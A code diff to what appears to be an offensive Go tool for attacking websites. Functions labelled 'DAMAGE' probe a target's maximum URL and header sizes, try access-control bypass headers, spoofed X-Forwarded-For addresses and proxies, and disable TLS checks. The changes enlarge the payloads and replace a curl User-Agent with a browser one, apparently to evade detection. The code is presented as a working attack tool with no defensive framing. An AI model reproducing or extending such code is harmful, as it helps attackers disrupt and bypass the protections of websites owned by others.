@@ -236,10 +236,10 @@ var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
 // ================== DAMAGE 1 ==================
 func PMP(target string) int {
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
-sizes := []int{64, 128, 256, 512, 1024, 2048, 4096}
+sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
 Berhasil := 0
 for _, size := range sizes {
 testURL := target
@@ -248,7 +248,7 @@ testURL += "&big=" + strings.Repeat("x", size)
 } else {
 testURL += "?big=" + strings.Repeat("x", size)}
 req, _ := http.NewRequest("GET", testURL, nil)
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 resp, err := client.Do(req)
 if err != nil {
 break
@@ -267,14 +267,14 @@ return Berhasil
 // ================== DAMAGE 2 ==================
 func PMH(target string) int {
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
-sizes := []int{512, 1024, 2048, 4096, 8192}
+sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
 Berhasil := 0
 for _, size := range sizes {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 req.Header.Set("X-Large-Data", strings.Repeat("x", size))
 resp, err := client.Do(req)
 if err != nil {
@@ -294,7 +294,7 @@ return Berhasil
 // ================== DAMAGE 3 ==================
 func PHR(target string, ProxyX string) map[string]bool {
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 parsedTarget, _ := url.Parse(target)
@@ -316,7 +316,7 @@ HeadersBypas := []string{
 result := make(map[string]bool)
 for _, h := range HeadersBypas {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 switch h {
 case "X-Original-URL":
 req.Header.Set("X-Original-URL", "/"+RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8))
@@ -379,12 +379,12 @@ candidates := []string{
 }
 var valid []string
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, origin := range candidates {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 if origin != "" {
 req.Header.Set("Origin", origin)}
 resp, err := client.Do(req)
@@ -409,7 +409,7 @@ testUAs := []string{
 "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",}
 var valid []string
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, ua := range testUAs {
@@ -440,12 +440,12 @@ testReferers := []string{
 }
 var valid []string
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, ref := range testReferers {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 if ref != "" {
 req.Header.Set("Referer", ref)}
 resp, err := client.Do(req)
@@ -468,12 +468,12 @@ if p != "" {
 testIPs = append(testIPs, p)}}
 var valid []string
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, ip := range testIPs {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 req.Header.Set("X-Forwarded-For", ip)
 resp, err := client.Do(req)
 if err != nil {
@@ -492,7 +492,7 @@ func HMETHOD(target string) []string {
 methods := []string{"GET", "POST", "OPTIONS"}
 var valid []string
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, method := range methods {
@@ -500,7 +500,7 @@ req, _ := http.NewRequest(method, target, nil)
 if method == "POST" {
 req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 req.Body = io.NopCloser(strings.NewReader(""))}
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 resp, err := client.Do(req)
 if err != nil {
 continue
@@ -518,12 +518,12 @@ func ENCOD(target string) []string {
 encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
 var valid []string
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, enc := range encodings {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 req.Header.Set("Accept-Encoding", enc)
 resp, err := client.Do(req)
 if err != nil {
@@ -542,12 +542,12 @@ func CACH(target string) []string {
 controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
 var valid []string
 client := &http.Client{
-Timeout: 6 * time.Second,
+Timeout: 5 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, cc := range controls {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "curl/8")
+req.Header.Set("User-Agent", "Mozilla/5.0")
 req.Header.Set("Cache-Control", cc)
 resp, err := client.Do(req)
 if err != nil {
@@ -630,6 +630,7 @@ parsed, _ := url.Parse(tgt)
 host := parsed.Hostname()
 if strings.HasPrefix(host, "www.") {
 host = host[4:]}
+
 var PRX []*url.URL
 
 // ================== Nama Proxy ==================
@@ -662,6 +663,7 @@ fmt.Printf("%s▶ Proses Bypass!%s\n", IJO, HAPUS)
 MaxP := PMP(tgt)
 MaxHead := PMH(tgt)
 Supported := PHR(tgt, ProxyX)
+
 HVERSI := HSUPPORT(tgt)
 VORI := ORIGIN(tgt)
 VUAS := UA_TEST(tgt)
@@ -670,6 +672,7 @@ VIPS := PPHEAD(tgt, proxyIPs)
 VMET := HMETHOD(tgt)
 VENC := ENCOD(tgt)
 VCAC := CACH(tgt)
+
 PRLT := PREST{
 VOR: VORI,
 VUA: VUAS,
